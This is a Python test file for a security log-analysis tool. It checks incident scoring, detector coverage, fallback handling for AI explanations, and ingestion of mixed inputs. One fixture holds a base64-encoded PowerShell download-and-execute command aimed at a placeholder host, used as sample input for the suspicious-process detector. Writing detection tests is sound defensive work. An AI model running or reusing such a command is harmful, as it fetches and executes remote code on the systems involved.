import json
import base64
from pathlib import Path
from types import SimpleNamespace
from unittest.mock import patch

from trace_verified.cli import main
from trace_verified.detection import detect
from trace_verified.ingestion import ingest_files
from trace_verified.explainer import ExplanationResult


def test_analyze_cli_returns_incident_score_and_coverage(tmp_path, capsys):
    source = tmp_path / "failures.jsonl"
    rows = []
    for second in range(5):
        rows.append(json.dumps({
            "timestamp": f"2026-04-10T10:00:0{second}Z", "user": "alice", "host": "ws-1",
            "event_type": "4625", "source_ip": "203.0.113.10", "Status": "0xC000006A",
        }))
    rows.append(json.dumps({"timestamp": "2026-04-10T10:00:10Z", "user": "alice", "host": "ws-1",
                            "event_type": "file_access", "path": "C:\\Temp\\unrelated.txt"}))
    source.write_text("\n".join(rows) + "\n", encoding="utf-8")
    assert main(["analyze", str(source)]) == 0
    output = json.loads(capsys.readouterr().out)
    assert len(output["incidents"]) == 1
    incident = output["incidents"][0]
    assert incident["score"] == 40
    assert incident["severity"] == "medium"
    assert incident["scoring_notice"].startswith("Heuristic")
    assert len(output["detector_coverage"]) == 4
    assert len(output["supporting_events"]) == 5
    assert all({"event_id", "source", "source_row", "raw_sha256", "raw_record", "timestamp",
                "user", "host", "command_line"} <= event.keys() for event in output["supporting_events"])
    assert all("unrelated.txt" not in json.dumps(event) for event in output["supporting_events"])
    assert "ai_explanations" not in output


def test_explain_flag_adds_separate_status_and_keeps_deterministic_score(tmp_path, capsys):
    source = tmp_path / "process.jsonl"
    source.write_text(json.dumps({
        "timestamp": "2026-04-10T10:00:00Z", "user": "alice", "host": "ws-1",
        "event_type": "process_start", "process": "mshta.exe", "command_line": "mshta.exe sample.hta",
    }) + "\n", encoding="utf-8")
    assert main(["analyze", str(source)]) == 0
    baseline = json.loads(capsys.readouterr().out)
    mocked = ExplanationResult("inc-test", "deterministic_fallback",
                               "Deterministic fallback — no AI explanation", None,
                               {"incident_summary": "fallback"}, "Ollama offline", "transport")
    with patch("trace_verified.cli.explain_incident", return_value=mocked) as explain:
        assert main(["analyze", str(source), "--explain"]) == 0
    output = json.loads(capsys.readouterr().out)
    assert len(output["ai_explanations"]) == 1
    assert output["ai_explanations"][0]["status"] == "deterministic_fallback"
    assert output["incidents"][0]["score"] == baseline["incidents"][0]["score"]
    explain.assert_called_once()


def test_cli_default_explanation_timeout_is_180_seconds(tmp_path, capsys):
    source = tmp_path / "process.jsonl"
    _write_distinct_process_incidents(source, 1)
    seen = []

    def explained(incident, findings, events, config):
        seen.append(config.timeout_seconds)
        return ExplanationResult(incident.incident_id, "local_model", "AI-generated explanation — not evidence",
                                "phi4-mini:latest", {
                                    "incident_summary": "summary", "attack_interpretation": "interpretation",
                                    "evidence_ids": incident.supporting_event_ids[:1],
                                    "alternative_explanations": ["verify"], "recommended_actions": ["Review logs"],
                                    "limitations": ["limited"],
                                })

    with patch("trace_verified.cli.explain_incident", side_effect=explained):
        assert main(["analyze", str(source), "--explain", "--max-explain", "1"]) == 0
    output = json.loads(capsys.readouterr().out)
    assert seen == [180.0]
    assert output["ai_explanations"][0]["status"] == "local_model"


def _write_distinct_process_incidents(path, count=4):
    path.write_text("\n".join(json.dumps({
        "timestamp": f"2026-04-10T10:00:0{index}Z", "user": f"user-{index}",
        "host": f"ws-{index}", "event_type": "process_start", "process": "mshta.exe",
        "command_line": f"mshta.exe sample{index}.hta",
    }) for index in range(count)) + "\n", encoding="utf-8")


def test_cli_persists_deterministic_report_before_unexpected_explainer_error(tmp_path):
    source, output_path = tmp_path / "events.jsonl", tmp_path / "report.json"
    _write_distinct_process_incidents(source, 2)
    calls = 0

    def fail_after_inspecting(incident, findings, events, config):
        nonlocal calls
        calls += 1
        deterministic = json.loads(output_path.read_text(encoding="utf-8"))
        assert len(deterministic["incidents"]) == 2
        if calls == 1:
            assert "ai_explanations" not in deterministic
        else:
            assert len(deterministic["ai_explanations"]) == 1
        if calls == 1:
            raise RuntimeError("unexpected explainer defect")
        return ExplanationResult(incident.incident_id, "local_model", "AI-generated explanation — not evidence",
                                "phi4-mini:latest", {
                                    "incident_summary": "summary", "attack_interpretation": "interpretation",
                                    "evidence_ids": incident.supporting_event_ids[:1],
                                    "alternative_explanations": ["verify change records"],
                                    "recommended_actions": ["Review logs"], "limitations": ["limited sample"],
                                })

    with patch("trace_verified.cli.explain_incident", side_effect=fail_after_inspecting):
        from trace_verified.cli import main
        assert main(["analyze", str(source), "--explain", "--output", str(output_path)]) == 0
    result = json.loads(output_path.read_text(encoding="utf-8"))
    assert len(result["incidents"]) == 2
    assert sorted(item["status"] for item in result["ai_explanations"]) == ["deterministic_fallback", "local_model"]
    assert any(item["error_kind"] == "unexpected_error" for item in result["ai_explanations"])


def test_cli_explanation_limit_priority_and_timeout(tmp_path, capsys):
    source = tmp_path / "events.jsonl"
    _write_distinct_process_incidents(source, 4)
    calls = []

    def explained(incident, findings, events, config):
        calls.append((incident.incident_id, config.timeout_seconds))
        return ExplanationResult(incident.incident_id, "local_model", "AI-generated explanation — not evidence",
                                "phi4-mini:latest", {
                                    "incident_summary": "summary", "attack_interpretation": "interpretation",
                                    "evidence_ids": incident.supporting_event_ids[:1],
                                    "alternative_explanations": ["verify"], "recommended_actions": ["Review logs"],
                                    "limitations": ["limited"],
                                })

    with patch("trace_verified.cli.explain_incident", side_effect=explained):
        from trace_verified.cli import main
        assert main(["analyze", str(source), "--explain", "--max-explain", "2",
                     "--explain-timeout", "7", "--max-incident-findings", "10"]) == 0
    output = json.loads(capsys.readouterr().out)
    assert len(output["incidents"]) == 4
    assert len(calls) == 2
    assert all(timeout == 7 for _, timeout in calls)
    assert len(output["ai_explanations"]) == 4
    assert sum(item["status"] == "local_model" for item in output["ai_explanations"]) == 2
    assert sum(item["error_kind"] == "not_selected" for item in output["ai_explanations"]) == 2


def test_cli_stops_model_probes_after_transport_failure(tmp_path, capsys):
    source = tmp_path / "events.jsonl"
    _write_distinct_process_incidents(source, 3)
    unreachable = ExplanationResult("inc-test", "deterministic_fallback", "Deterministic fallback — no AI explanation",
                                    None, {"incident_summary": "fallback"}, "offline", "transport")
    with patch("trace_verified.cli.explain_incident", return_value=unreachable) as explain:
        from trace_verified.cli import main
        assert main(["analyze", str(source), "--explain", "--max-explain", "3"]) == 0
    output = json.loads(capsys.readouterr().out)
    assert explain.call_count == 1
    assert len(output["incidents"]) == 3
    assert all(item["status"] == "deterministic_fallback" for item in output["ai_explanations"])
    assert sum(item["error_kind"] == "transport" for item in output["ai_explanations"]) == 3


def test_unmatched_approval_id_is_reported_in_analyze_output(tmp_path, capsys):
    source = tmp_path / "one.jsonl"
    source.write_text(json.dumps({
        "timestamp": "2026-04-10T10:00:00Z", "user": "alice", "host": "ws-1",
        "event_type": "process_start", "process": "mshta.exe", "command_line": "mshta.exe test.hta",
    }) + "\n", encoding="utf-8")
    assert main(["analyze", str(source), "--approved-finding-id", "fnd_does_not_exist"]) == 0
    output = json.loads(capsys.readouterr().out)
    assert output["approval_warnings"] == ["Approved finding ID did not match any finding: fnd_does_not_exist"]


def test_analyze_cli_accepts_mixed_input_files_and_reports_each_source(tmp_path, capsys):
    auth = tmp_path / "auth.csv"
    auth.write_text("timestamp,user,host,event_type,source_ip,status\n" + "".join(
        f"2026-04-10T10:00:0{second}Z,alice,ws-1,4625,203.0.113.10,0xC000006A\n"
        for second in range(5)), encoding="utf-8")
    encoded = base64.b64encode("IEX (New-Object Net.WebClient).DownloadString('http://example.invalid/a')".encode("utf-16le")).decode("ascii")
    process = tmp_path / "endpoint.jsonl"
    process.write_text(json.dumps({
        "timestamp": "2026-04-10T10:00:08Z", "user": "alice", "host": "ws-1",
        "event_type": "process_start", "process": "powershell.exe",
        "command_line": f"powershell.exe -EncodedCommand {encoded}",
    }) + "\n", encoding="utf-8")

    assert main(["analyze", str(auth), str(process)]) == 0
    output = json.loads(capsys.readouterr().out)
    assert output["ingestion"]["accepted_rows"] == 6
    assert len(output["source_ingestion"]) == 2
    assert {Path(row["source"]).name for row in output["source_ingestion"]} == {"auth.csv", "endpoint.jsonl"}
    assert {finding["rule_id"] for finding in output["findings"]} == {"auth.brute_force", "process.suspicious"}


def test_finding_ids_change_when_same_input_is_invoked_from_different_paths(tmp_path):
    rows = "\n".join(json.dumps({
        "timestamp": f"2026-04-10T10:00:0{second}Z", "user": "alice", "host": "ws-1",
        "event_type": "4625", "source_ip": "203.0.113.10", "status": "0xC000006A",
    }) for second in range(5)) + "\n"
    left = tmp_path / "left" / "auth.jsonl"
    right = tmp_path / "right" / "auth.jsonl"
    left_extra = tmp_path / "left" / "other.jsonl"
    right_extra = tmp_path / "right" / "other.jsonl"
    left.parent.mkdir()
    right.parent.mkdir()
    left.write_text(rows, encoding="utf-8")
    right.write_text(rows, encoding="utf-8")
    unrelated = json.dumps({"timestamp": "2026-04-10T10:00:20Z", "user": "bob", "host": "ws-2",
                            "event_type": "file_access"}) + "\n"
    left_extra.write_text(unrelated, encoding="utf-8")
    right_extra.write_text(unrelated, encoding="utf-8")
    left_events, _ = ingest_files([left, left_extra])
    right_events, _ = ingest_files([right, right_extra])
    left_id = next(item.finding_id for item in detect(left_events).findings if item.rule_id == "auth.brute_force")
    right_id = next(item.finding_id for item in detect(right_events).findings if item.rule_id == "auth.brute_force")
    assert left_id != right_id
